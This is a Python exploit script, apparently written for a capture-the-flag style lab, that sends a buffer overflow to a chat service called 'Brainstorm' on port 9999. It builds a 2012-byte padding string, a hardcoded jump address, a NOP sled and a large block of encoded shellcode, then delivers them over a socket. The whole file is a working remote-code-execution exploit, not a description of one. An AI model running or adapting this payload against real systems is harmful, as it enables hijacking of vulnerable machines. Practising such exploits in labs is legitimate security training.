import socket
import sys

# This is the address of the machine and service I want to attack
IPV4_Address = b"127.0.0.1"
Port_Number = b"9999"

#This information is based on the machines service module
username = b"GeardoRanger"
message = b"A" * 2012 + b"\xeb\x14\x50\x62" + b"\x90" * 10

#625014EB

test = b"Brainstorm"

payload = (b"\xbb\x21\x42\xb3\x5f\xdb\xcd\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x5a\x0e\x03\x7b\x4c\x51\xaa\x87\xb8\x17"
b"\x55\x77\x39\x78\xdf\x92\x08\xb8\xbb\xd7\x3b\x08\xcf\xb5\xb7"
b"\xe3\x9d\x2d\x43\x81\x09\x42\xe4\x2c\x6c\x6d\xf5\x1d\x4c\xec"
b"\x75\x5c\x81\xce\x44\xaf\xd4\x0f\x80\xd2\x15\x5d\x59\x98\x88"
b"\x71\xee\xd4\x10\xfa\xbc\xf9\x10\x1f\x74\xfb\x31\x8e\x0e\xa2"
b"\x91\x31\xc2\xde\x9b\x29\x07\xda\x52\xc2\xf3\x90\x64\x02\xca"
b"\x59\xca\x6b\xe2\xab\x12\xac\xc5\x53\x61\xc4\x35\xe9\x72\x13"
b"\x47\x35\xf6\x87\xef\xbe\xa0\x63\x11\x12\x36\xe0\x1d\xdf\x3c"
b"\xae\x01\xde\x91\xc5\x3e\x6b\x14\x09\xb7\x2f\x33\x8d\x93\xf4"
b"\x5a\x94\x79\x5a\x62\xc6\x21\x03\xc6\x8d\xcc\x50\x7b\xcc\x98"
b"\x95\xb6\xee\x58\xb2\xc1\x9d\x6a\x1d\x7a\x09\xc7\xd6\xa4\xce"
b"\x28\xcd\x11\x40\xd7\xee\x61\x49\x1c\xba\x31\xe1\xb5\xc3\xd9"
b"\xf1\x3a\x16\x4d\xa1\x94\xc9\x2e\x11\x55\xba\xc6\x7b\x5a\xe5"
b"\xf7\x84\xb0\x8e\x92\x7f\x53\xce\x62\x7f\xa2\x58\x61\x7f\xb5"
b"\xc4\xec\x99\xdf\xe4\xb8\x32\x48\x9c\xe0\xc8\xe9\x61\x3f\xb5"
b"\x2a\xe9\xcc\x4a\xe4\x1a\xb8\x58\x91\xea\xf7\x02\x34\xf4\x2d"
b"\x2a\xda\x67\xaa\xaa\x95\x9b\x65\xfd\xf2\x6a\x7c\x6b\xef\xd5"
b"\xd6\x89\xf2\x80\x11\x09\x29\x71\x9f\x90\xbc\xcd\xbb\x82\x78"
b"\xcd\x87\xf6\xd4\x98\x51\xa0\x92\x72\x10\x1a\x4d\x28\xfa\xca"
b"\x08\x02\x3d\x8c\x14\x4f\xcb\x70\xa4\x26\x8a\x8f\x09\xaf\x1a"
b"\xe8\x77\x4f\xe4\x23\x3c\x7f\xaf\x69\x15\xe8\x76\xf8\x27\x75"
b"\x89\xd7\x64\x80\x0a\xdd\x14\x77\x12\x94\x11\x33\x94\x45\x68"
b"\x2c\x71\x69\xdf\x4d\x50")

try:
    print("Trying initial coonnection with machine...")
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 9999))
    print("CONNECTION SUCCESS!, Sending payload and breaking the program...")
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    print("Username sent successfully")
    s.send(message + payload + b'\r\n')
    print("Message sent successfully")
    s.recv(1024)
    s.close()
    print(message + payload)

except:
    print("The server is not available to connect to")
    sys.exit()
